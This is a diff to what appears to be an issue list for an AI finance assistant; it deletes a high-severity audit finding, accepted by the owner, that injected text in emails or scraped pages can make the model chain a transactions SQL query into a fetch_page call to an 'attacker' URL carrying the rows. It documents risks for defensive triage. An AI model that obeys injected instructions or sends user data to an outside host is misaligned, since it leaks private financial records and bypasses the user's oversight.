@@ -13,24 +13,6 @@ Issues are rated by **impact** (how wrong does it make the numbers?) and **effor
 
 ---
 
-## 🔴 High — a prompt injection can send the ledger out in a `fetch_page` URL
-
-**Owner decision 2026-10-05: known and accepted.** Security audit 2026-08-25 FINDING 1:
-`run_sql_query` and `fetch_page` are both read-classified (`always_allow`, never gated), and the
-model chooses the whole URL. Injected instructions (an email body, a statement memo, a scraped
-page) can chain `SELECT … FROM transactions` into `fetch_page("https://attacker/c?d=<rows>")`
-with no confirm card. A 256-char query+fragment cap bounded this until 2026-10-05, when it was
-removed because it refused signed capability links (a Steam receipt's ~900-char `sparams`
-token) that the unattended email-scan automation must read. `assert_public_url` still blocks
-private/metadata targets.
-
-**Fix direction:** an `egress` axis beside `mutates=` so outbound fetches can be scoped (e.g. a
-per-automation host allowlist for receipt domains) without a length heuristic.
-
-**Impact:** high (whole-ledger exfiltration on a default install). **Effort:** medium.
-
----
-
 ## 🟡 Medium — apply_* AI tools trust conversational confirmation, not a server-stashed nonce
 
 **Observed in production (2026-06-12):** mid-conversation, the chat model re-invoked
